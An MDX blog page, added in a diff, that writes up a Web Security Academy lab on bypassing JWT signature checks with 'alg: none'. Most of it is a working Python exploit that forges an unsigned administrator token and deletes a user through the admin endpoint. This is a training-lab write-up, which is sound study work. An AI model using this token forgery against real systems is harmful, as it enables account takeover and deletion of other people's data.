@@ -1,0 +1,141 @@
+---
+title: 'JWT Lab 2'
+description: 'Demonstrating how bypassing JWT signature verification using "alg": "none" can lead to full account compromise through token forgery.'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## JWT Authentication Bypass via `alg: none`
+
+<div style="text-align: justify;">
+  In this lab, I discovered a critical vulnerability in how JSON Web Tokens (JWTs) were being verified by the server. The server accepted tokens with `"alg": "none"`—which effectively means no signature validation was performed. This oversight allowed me to forge a JWT, impersonate the administrator, and delete other user accounts.
+
+  By logging in as a regular user and capturing a valid JWT, I modified its payload and header to remove the signature requirement and change the `sub` claim to `administrator`. The server trusted the token blindly and executed privileged actions, such as user deletion. This exercise was a clear demonstration of why signature validation is crucial in JWT-based authentication systems.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- Log in as **wiener** to obtain a valid session JWT.
+- Extract the JWT and decode the payload.
+- Modify the `sub` field to `"administrator"` and set the `alg` in the header to `"none"`.
+- Forge the JWT without a signature.
+- Use this unsigned JWT to send an admin-level request to delete the target user.
+- Monitor the steps using Burp Suite history to understand the manipulation.
+
+### Usage
+
+```bash
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import base64
+import json
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+                        
+# Set Burp proxy
+proxies = {
+'http': 'http://127.0.0.1:8080',
+'https': 'http://127.0.0.1:8080'
+}
+
+# Base64 encode JSON without padding
+def b64encode(data):
+    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
+
+# Get CSRF token from login page
+def get_csrf_token(s, url):
+    r = s.get(url + "/login", verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, "html.parser")
+    token = soup.find("input", {"name": "csrf"})["value"]
+    return token
+
+# Log in and extract session JWT
+def login_and_get_jwt(s, url, username, password):
+    csrf = get_csrf_token(s, url)
+    data = {
+        "csrf": csrf,
+        "username": username,
+        "password": password
+    }
+
+    r = s.post(url + "/login", data=data, verify=False, proxies=proxies, allow_redirects=False)
+    
+    if "session" not in r.cookies:
+        print("[-] Login failed or JWT cookie not found.")
+        sys.exit(1)
+
+    return r.cookies.get("session")
+
+# Forge new JWT with alg: none and sub: administrator
+def forge_jwt(original_jwt):
+    # Decode original JWT (split into header, payload, signature)
+    parts = original_jwt.split('.')
+    if len(parts) != 3:
+        print("[-] Invalid JWT format.")
+        sys.exit(1)
+
+    # Decode payload and modify 'sub'
+    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
+    payload['sub'] = 'administrator'
+
+    # Create new header
+    header = {"alg": "none"}
+
+    # Forge unsigned JWT
+    forged = b64encode(header) + "." + b64encode(payload) + "."
+    return forged
+
+# Use the forged token to delete a target user
+def delete_user(s, url, token, target_user):
+    uri = f"/admin/delete?username={target_user}"
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Referer": f"{url}/admin"
+    }
+    cookies = {"session": token}
+
+    r = s.get(url + uri, headers=headers, cookies=cookies, verify=False, proxies=proxies)
+
+    if "User deleted successfully" in r.text or r.status_code == 200:
+        print(f"[+] User '{target_user}' deleted successfully.")
+    else:
+        print(f"[-] Failed to delete user '{target_user}'.")
+        print(r.text)
+
+ # Main script
+if __name__ == "__main__":
+    try:
+         url = sys.argv[1].strip().rstrip("/")
+    except IndexError:
+        print(f"[-] Usage: {sys.argv[0]} <url>")
+        sys.exit(1)
+
+    session = requests.Session()
+
+    # Step 1: Login as 'wiener' and get original JWT
+    original_jwt = login_and_get_jwt(session, url, "wiener", "peter")
+    print(f"[+] Original JWT: {original_jwt}")
+
+    # Step 2: Forge JWT with admin privileges
+    forged_token = forge_jwt(original_jwt)
+    print(f"[+] Forged JWT: {forged_token}")
+
+    # Step 3: Use forged token to delete 'carlos'
+    delete_user(session, url, forged_token, "carlos")
+```
+
+import { Comment } from 'astro-pure/advanced'
+
+<Comment />
